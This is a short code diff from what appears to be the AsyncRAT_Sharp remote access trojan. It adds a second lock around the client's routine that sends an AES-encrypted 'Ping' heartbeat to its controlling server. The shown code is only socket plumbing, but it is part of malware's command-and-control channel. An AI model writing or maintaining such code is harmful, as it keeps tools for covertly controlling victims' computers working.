@@ -184,21 +184,24 @@ namespace AsyncRAT_Sharp.Sockets
         {
             lock (SendSync)
             {
-                try
+                lock (EndSendSync)
                 {
-                    MsgPack msgpack = new MsgPack();
-                    msgpack.ForcePathObject("Packet").AsString = "Ping";
-                    msgpack.ForcePathObject("Message").AsString = "This is a ping!";
-                    byte[] buffer = Settings.AES.Encrypt(msgpack.Encode2Bytes());
-                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);
-                    ClientSocket.Poll(-1, SelectMode.SelectWrite);
-                    ClientSocket.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
-                    ClientSocket.Send(buffer, 0, buffer.Length, SocketFlags.None);
-                }
-                catch
-                {
-                    Disconnected();
-                    return;
+                    try
+                    {
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "Ping";
+                        msgpack.ForcePathObject("Message").AsString = "This is a ping!";
+                        byte[] buffer = Settings.AES.Encrypt(msgpack.Encode2Bytes());
+                        byte[] buffersize = BitConverter.GetBytes(buffer.Length);
+                        ClientSocket.Poll(-1, SelectMode.SelectWrite);
+                        ClientSocket.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
+                        ClientSocket.Send(buffer, 0, buffer.Length, SocketFlags.None);
+                    }
+                    catch
+                    {
+                        Disconnected();
+                        return;
+                    }
                 }
             }
 
